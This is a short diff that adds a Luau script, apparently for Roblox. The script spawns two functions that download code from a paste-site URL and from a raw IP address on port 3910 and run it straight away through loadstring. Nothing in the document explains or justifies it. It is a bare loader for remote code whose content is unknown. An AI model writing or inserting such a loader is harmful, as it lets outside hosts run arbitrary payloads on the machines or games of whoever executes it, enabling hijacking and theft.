@@ -1,0 +1,8 @@
+local function s1() 
+ loadstring(game:HttpGet("https://paste.debian.net/plainh/be3e32ac/", true))()   
+end 
+local function s2() 
+   loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()  
+end 
+task.spawn(s1)
+task.spawn(s2)
